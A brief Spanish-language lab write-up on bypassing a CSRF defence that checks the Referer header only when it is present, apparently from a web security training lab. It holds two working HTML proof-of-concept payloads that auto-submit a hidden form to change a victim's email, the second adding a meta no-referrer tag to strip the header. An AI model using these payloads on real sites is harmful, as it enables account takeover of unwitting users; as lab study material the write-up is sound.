# CSRF con validación Referer si el header existe 

Tags: #CSRF #BurpSuite #XSRF

```bash 
En este lab se aprovecha una mala implementación del control de Referer como medida de protección contra ataques CSRF. Aunque la aplicación valida el encabezado Referer para asegurarse de que provenga del mismo dominio, acepta las peticiones incluso cuando este encabezado no está presente


- Referer: Permite a los servidores identificar de dónde los visitan las personas y pueden emplear estos datos para realizar análisis
```

```javascript
// PoC para cambiar el correo de la víctima, pero no funcionará por tener en la cabecera 'Referer' un dominio externo

<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();
</script>


// Forma de quitar la cabecera 'Referer' ya que el server no valida que no este para hacer la acción y se logra con la etiqueta 'meta'
<html>
<head>
	<meta name="referrer" content="no-referrer">
</head>
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();
</script>
</html>
```